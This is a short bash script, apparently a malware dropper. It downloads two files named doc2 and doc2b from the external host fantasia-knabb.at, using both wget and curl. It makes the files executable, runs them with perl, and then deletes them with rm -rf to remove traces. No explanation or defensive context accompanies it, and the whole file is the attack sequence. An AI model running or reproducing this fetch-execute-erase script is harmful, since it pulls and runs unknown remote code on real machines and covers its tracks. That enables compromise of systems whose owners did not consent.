#!/bin/bash

wget http://fantasia-knabb.at/doc2
wget http://fantasia-knabb.at/doc2b
curl -O http://fantasia-knabb.at/doc2
curl -O http://fantasia-knabb.at/doc2b
chmod +x doc2
chmod +x doc2b
perl doc2
perl doc2b
rm -rf doc2 doc2b doc2*
